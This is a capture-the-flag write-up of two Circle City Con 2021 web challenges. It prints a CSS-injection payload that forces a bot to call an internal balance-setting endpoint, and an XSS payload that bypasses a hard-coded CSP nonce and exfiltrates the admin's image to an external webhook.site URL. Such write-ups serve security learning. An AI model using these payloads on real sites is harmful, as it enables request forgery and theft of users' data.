# Circle City Con CTF 2021

I couldn't solve Puppet and Sticky Notes.

# Casino
## description
> Can you make $1000 off Casino#4970 on our Discord server? (say `$help` to view commands)

## solution
According to the description, we need to get $1000.
So the goal would be to make the balance of the account greater than 1000 in the /setBalance endpoint.
Since /setBalace is an internal endpoint, we need to direct the bot to it.
```

app.get('/set_balance', internal, async (req, res) => { 
  const user = req.query.user
  if (user === undefined || user.length > 64) {
    return res.status(400).json({ error: 'Invalid user string' })
  }

  const balance = parseInt(req.query.balance)
  if (isNaN(balance)) {
    return res.status(400).json({ error: 'Invalid balance' })
  }

  await setBalance(user, balance)
  return res.status(200).end()
})


```
This endpoint can be used with the GET method, so it does not require XSS.
Therefore, we can use the /badge endpoint, which allows us to enter arbitrary CSS, to send requests to /setBalance.　　

```
$badge * {
    background: url(http://172.16.0.10:3000/set_balance?user={account_name}&balance=1001)
}
```

After that ,send $flag
```
CCC{maybe_1_sh0uldv3d_us3d_P0ST_in5t3ad_of_G3T}
```

# imgfiltrate
## description
>Can you yoink an image from the admin page?
## solution
There is a flag.php file on the application server, and the contents show that if you have a secret_token, you can get a flag.
And the token is in the bot's possession. Therefore, the goal is to get the image by XSS.
If you look at index.php, you can see that name is output as echo, so XSS is possible.
Also, the CSP (nonce base) is set, but the nonce is hard-coated, so it can be bypassed.
Looking at the bot, the cookie is set against imgfiltrate.hub.
Therefore, you need to direct the bot to http://imgfiltrate.hub/?name=~~.
### XSS Payload
Draw the image to canvas, convert it to base64, and retrieve it.  
Replace payload with ~~.

```
<script nonce=70861e83ad7f1863b3020799df93e450>
    const a = document.createElement('canvas');
        document.body.append(a);
        a.setAttribute('id','canvas');
        var canvas = document.getElementById('canvas');
        var ctx = canvas.getContext('2d');
        var img = document.getElementById('flag');
        setTimeout(function(){
            ctx.drawImage(img,0,0,100,40);
            var dataURL = canvas.toDataURL('image/jpeg', 0.7);
            location = `http://webhook.site/7ab26888-4775-4acd-a827-adaed7076e5c?a=${dataURL}`;
       },2000)
    </script>

```
Then decode it to get the flags.
>space needs to be replaced with +.

```
CCC{c4nvas_b64}
```

